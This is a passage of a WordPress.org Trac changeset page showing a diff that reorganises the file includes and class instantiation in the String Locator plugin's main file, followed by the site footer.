  | 35 |  | require\_once( \_\_DIR\_\_ . '/includes/class-string-locator.php' ); |
  |  | 37 | /\*\* |
  |  | 38 | \* Plugin test runners |
  |  | 39 | \*/ |
  |  | 40 | require\_once \_\_DIR\_\_ . '/includes/Tests/class-loopback.php'; |
  |  | 41 | require\_once \_\_DIR\_\_ . '/includes/Tests/class-smart-scan.php'; |
  |  | 42 |  |
  |  | 43 | /\*\* |
  |  | 44 | \* Plugin action classes. |
  |  | 45 | \*/ |
  |  | 46 | require\_once \_\_DIR\_\_ . '/includes/class-save.php'; |
  |  | 47 | require\_once \_\_DIR\_\_ . '/includes/class-search.php'; |
  |  | 48 | require\_once \_\_DIR\_\_ . '/includes/class-directory-iterator.php'; |
  |  | 49 |  |
  |  | 50 | /\*\* |
  |  | 51 | \* Prepare REST endpoints. |
  |  | 52 | \*/ |
  |  | 53 | require\_once \_\_DIR\_\_ . '/includes/REST/class-base.php'; |
  |  | 54 | require\_once \_\_DIR\_\_ . '/includes/REST/class-save.php'; |
  |  | 55 | require\_once \_\_DIR\_\_ . '/includes/REST/class-clean.php'; |
  |  | 56 | require\_once \_\_DIR\_\_ . '/includes/REST/class-search.php'; |
  |  | 57 | require\_once \_\_DIR\_\_ . '/includes/REST/class-directory-structure.php'; |
  | 36 | 58 |  |
  | 37 | 59 | /\*\* |
  | 38 | 60 | \* Instantiate the plugin |
  | 39 | 61 | \*/ |
  | 40 |  | $string\_locator = new String\_Locator(); |
  |  | 62 | require\_once \_\_DIR\_\_ . '/includes/class-string-locator.php'; |
  |  | 63 | new String\_Locator(); |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2685592)
* [Zip Archive](?format=zip&new=2685592)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


